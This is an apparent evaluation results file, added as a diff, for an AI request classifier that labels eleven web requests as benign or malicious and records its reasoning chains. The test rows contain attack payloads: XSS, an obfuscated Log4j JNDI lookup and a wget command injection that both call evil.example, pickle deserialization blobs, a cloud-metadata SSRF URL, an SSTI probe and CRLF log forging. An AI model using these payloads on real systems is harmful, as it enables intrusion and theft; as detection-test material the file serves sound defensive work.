@@ -1,0 +1,220 @@
+{
+  "policy": "confidence_without_fast_score",
+  "clean": {
+    "total": 98,
+    "not_clean": 0,
+    "leaks": []
+  },
+  "summary": {
+    "scored": 11,
+    "tp": 8,
+    "fn": 0,
+    "fp": 0,
+    "tn": 3,
+    "accuracy": 1.0
+  },
+  "misses": [],
+  "false_blocks": [],
+  "rows": [
+    {
+      "id": "x01",
+      "label": "malicious",
+      "note": "xss event handler",
+      "tier": "suspicious",
+      "fast_score": 0.85,
+      "tool_trace": [],
+      "chain": "request: POST /api/comments with body order_id 3 and text \"<img src=x onmouseover=alert(1)>\"\nschema: matches declared POST /api/comments addComment, requires authentication, fields order_id and text\ntraversal: no\nsql: no\nxss: yes - text field \"<img src=x onmouseover=alert(1)>\"\ncommand: no\nlog4j: no\nlog_forging: no\ncookie: no\ndeserialization: no\nssrf: no\nssti: no\nbola: no\nmass_assignment: no\ncontrol_plane: no\nconclusion: malicious - text field contains executable browser code img with onmouseover alert",
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "xss",
+        "reasoning": "Text field contains <img src=x onmouseover=alert(1)> which is executable browser code per xss yes line. Schema matches POST /api/comments but payload is attack technique not legitimate comment, corroborated by fast-filter injection signatures."
+      }
+    },
+    {
+      "id": "x02",
+      "label": "benign",
+      "note": "xss named in a sentence",
+      "tier": "clean",
+      "fast_score": 0.2081,
+      "tool_trace": [],
+      "chain": "request: POST /api/comments with body order_id 3 and text about script element teaching example\nschema: matches declared POST /api/comments addComment, requires auth, fields order_id and text\ntraversal: no\nsql: no\nxss: no - text names script element in sentence, does not contain script tag or code shape\ncommand: no\nlog4j: no\nlog_forging: no\ncookie: no\ndeserialization: no\nssrf: no\nssti: no\nbola: no - order_id is declared field, no evidence of accessing another user's order\nmass_assignment: no - only declared fields order_id, text present\ncontrol_plane: no - declared operation, not admin/internal path\nconclusion: benign, text is discussion naming technique not browser code",
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.05,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Request matches declared POST /api/comments with only order_id and text. Text merely names a script element in a teaching sentence and contains no script code shape, with all families marked no."
+      }
+    },
+    {
+      "id": "x03",
+      "label": "malicious",
+      "note": "obfuscated log4j",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "chain": "request: POST /api/search with body {\"query\": \"${lower:j}ndi:ldap://evil.example/a\"}\nschema: matches declared operation POST /api/search searchCatalog with field query, no auth\ntraversal: no\nsql: no\nxss: no\ncommand: no\nlog4j: yes in body_preview query field ${lower:j}ndi:ldap://evil.example/a\nlog_forging: no\ncookie: no\ndeserialization: no\nssrf: no\nssti: no\nbola: no\nmass_assignment: no\ncontrol_plane: no\nconclusion: malicious, obfuscated Log4j JNDI LDAP lookup in query field that expands to jndi lookup",
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.97 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.97,
+        "recommended_action": "block",
+        "threat_type": "injection",
+        "reasoning": "Log4j line is yes for obfuscated ${lower:j}ndi:ldap://evil.example/a in query field that expands to jndi lookup. Schema matches POST /api/search but does not authorize JNDI execution, matching injection pattern for ${jndi: lookups. Fast-filter injection signature corroborates malicious technique."
+      }
+    },
+    {
+      "id": "x04",
+      "label": "malicious",
+      "note": "crlf log forging",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "chain": "request: GET /api/files?name=report%0aINFO+admin+logged+in with empty body\nschema: matches declared operation GET /api/files downloadFile, query name required, no auth\ntraversal: no\nsql: no\nxss: no\ncommand: no\nlog4j: no\nlog_forging: yes - query field name contains %0a newline plus forged log line INFO admin logged in\ncookie: no\ndeserialization: no\nssrf: no\nssti: no\nbola: no\nmass_assignment: no\ncontrol_plane: no\nconclusion: malicious - CRLF in query name forges log entry, corroborated by fast-filter log forging signature",
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.90 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.9,
+        "recommended_action": "alert",
+        "threat_type": "log_forging",
+        "reasoning": "Query name contains %0a newline followed by forged 'INFO admin logged in' line, marked log_forging yes in checklist. Fast-filter log forging signature corroborates the technique and schema shows newline has no legitimate use in file name."
+      }
+    },
+    {
+      "id": "x05",
+      "label": "benign",
+      "note": "newline in a comment",
+      "tier": "clean",
+      "fast_score": 0.2015,
+      "tool_trace": [],
+      "chain": "request: POST /api/comments with body order_id 4 and text hello newline please leave the box at the door\nschema: matches declared POST /api/comments addComment, auth required, fields order_id and text\ntraversal: no\nsql: no\nxss: no\ncommand: no\nlog4j: no\nlog_forging: no - newline in text comment field is prose, not header/query/identity forgery\ncookie: no\ndeserialization: no\nssrf: no\nssti: no\nbola: no - order_id 4 alone with no history of ownership mismatch is not evidence of object bypass\nmass_assignment: no - only declared fields order_id, text present\ncontrol_plane: no - /api/comments is declared application path, not admin/internal/debug\nconclusion: benign, legitimate delivery comment with no attack technique in any field",
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.05,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Request matches declared POST /api/comments with only order_id and text fields. Text is benign prose with newline, with no traversal, injection, XSS, or other attack technique per checklist."
+      }
+    },
+    {
+      "id": "x06",
+      "label": "malicious",
+      "note": "pickle deserialization",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "chain": "request: POST /api/tickets with subject box and body gASVBAAAAAAAAACMCGJ1aWx0aW5zlIwEc3lzdGVt\nschema: matches declared POST /api/tickets, auth required, fields body and subject declared\ntraversal: no\nsql: no\nxss: no\ncommand: yes - body contains builtins system pickle\nlog4j: no\nlog_forging: no\ncookie: no\ndeserialization: yes - body is base64 pickle object\nssrf: no\nssti: no\nbola: no\nmass_assignment: no\ncontrol_plane: no\nconclusion: malicious, body is pickle deserialization attempting builtins system execution",
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "deserialization",
+        "reasoning": "Body value is base64 pickle containing builtins system, matching deserialization yes and command yes in checklist. Declared POST /api/tickets expects plain subject/body text, not a serialized object. Fast-filter injection signature corroborates malicious technique."
+      }
+    },
+    {
+      "id": "x07",
+      "label": "malicious",
+      "note": "cookie payload",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [
+        "decode_value:{\"value\": \"gASVBAAAAAAAAACMCGJ1aWx0aW5z\"}"
+      ],
+      "chain": "request: POST /api/comments with body order_id 5 text ok and cookie session=gASVBAAAAAAAAACMCGJ1aWx0aW5z\nschema: matches declared POST /api/comments, auth required with object-level authorization\ntraversal: no\nsql: no\nxss: no\ncommand: no\nlog4j: no\nlog_forging: no\ncookie: yes - session cookie contains base64 serialized object\ndeserialization: yes - session cookie decodes to pickle containing builtins\nssrf: no\nssti: no\nbola: no\nmass_assignment: no\ncontrol_plane: no\nconclusion: malicious, serialized pickle object in session cookie indicates deserialization attack",
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "deserialization",
+        "reasoning": "Cookie line is yes as session value decodes from base64 to pickle containing builtins. Deserialization line is yes for serialized object in cookie on POST /api/comments which expects only order_id and text."
+      }
+    },
+    {
+      "id": "x08",
+      "label": "malicious",
+      "note": "ssrf metadata url",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "chain": "request: POST /api/tickets with body {\"subject\": \"fetch\", \"body\": \"http://169.254.169.254/latest/meta-data/\"}\nschema: matches declared POST /api/tickets createTicket, auth required, fields body, subject\ntraversal: no\nsql: no\nxss: no\ncommand: no\nlog4j: no\nlog_forging: no\ncookie: no\ndeserialization: no\nssrf: yes - body field http://169.254.169.254/latest/meta-data/\nssti: no\nbola: no\nmass_assignment: no\ncontrol_plane: no\nconclusion: malicious, SSRF URL to cloud metadata in ticket body",
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "ssrf",
+        "reasoning": "POST /api/tickets body contains http://169.254.169.254/latest/meta-data/. Checklist marks ssrf yes for parameter URL to metadata, with schema matching declared operation."
+      }
+    },
+    {
+      "id": "x09",
+      "label": "malicious",
+      "note": "ssti expression",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "chain": "request: POST /api/reviews with body order_id 6, rating 5, title hello {{7*7}}\nschema: matches declared POST /api/reviews, fields order_id rating title, auth required\ntraversal: no\nsql: no\nxss: no\ncommand: no\nlog4j: no\nlog_forging: no\ncookie: no\ndeserialization: no\nssrf: no\nssti: yes in title {{7*7}}\nbola: no\nmass_assignment: no\ncontrol_plane: no\nconclusion: malicious, template expression {{7*7}} in title is SSTI probe",
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.95 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.95,
+        "recommended_action": "block",
+        "threat_type": "injection",
+        "reasoning": "Title field contains template expression {{7*7}} marked ssti yes in checklist. This is a server-side template injection probe on POST /api/reviews matching fast-filter injection signature."
+      }
+    },
+    {
+      "id": "x10",
+      "label": "malicious",
+      "note": "command after semicolon",
+      "tier": "suspicious",
+      "fast_score": 0.75,
+      "tool_trace": [],
+      "chain": "request: POST /api/comments body {\"order_id\": 7, \"text\": \"ok; wget http://evil.example/x\"}\nschema: matches POST /api/comments addComment, auth required, fields order_id, text\ntraversal: no\nsql: no\nxss: no\ncommand: yes - text field \"ok; wget http://evil.example/x\"\nlog4j: no\nlog_forging: no\ncookie: no\ndeserialization: no\nssrf: no\nssti: no\nbola: no\nmass_assignment: no\ncontrol_plane: no\nconclusion: malicious - text field contains shell separator plus wget download command with fast-filter injection signature",
+      "action": "blocklisted",
+      "rationale": "malicious with confidence 0.92 >= 0.85",
+      "verdict": {
+        "is_malicious": true,
+        "confidence_score": 0.92,
+        "recommended_action": "block",
+        "threat_type": "injection",
+        "reasoning": "Checklist marks command yes for text field 'ok; wget http://evil.example/x' with shell separator plus wget command. Schema shows POST /api/comments expects order_id/text but payload contains command syntax per injection pattern. Fast-filter injection signature corroborates malicious intent."
+      }
+    },
+    {
+      "id": "x11",
+      "label": "benign",
+      "note": "ordinary order read",
+      "tier": "clean",
+      "fast_score": 0.072,
+      "tool_trace": [],
+      "chain": "request: GET /api/orders/15 with empty query and body\nschema: matches declared GET /api/orders/{orderId} requires auth\ntraversal: no\nsql: no\nxss: no\ncommand: no\nlog4j: no\nlog_forging: no\ncookie: no\ndeserialization: no\nssrf: no\nssti: no\nbola: no - single ID access with no enumeration and no evidence of foreign ID\nmass_assignment: no - no body fields\ncontrol_plane: no - declared order route, not admin/internal\nconclusion: benign, single declared read with no payload or enumeration evidence",
+      "action": "ignored",
+      "rationale": "model judged the request benign",
+      "verdict": {
+        "is_malicious": false,
+        "confidence_score": 0.05,
+        "recommended_action": "allow",
+        "threat_type": "benign",
+        "reasoning": "Request matches declared GET /api/orders/{orderId} with single ID 15 and empty body. Checklist shows no traversal, injection, or enumeration and fast filter is clean."
+      }
+    }
+  ]
+}
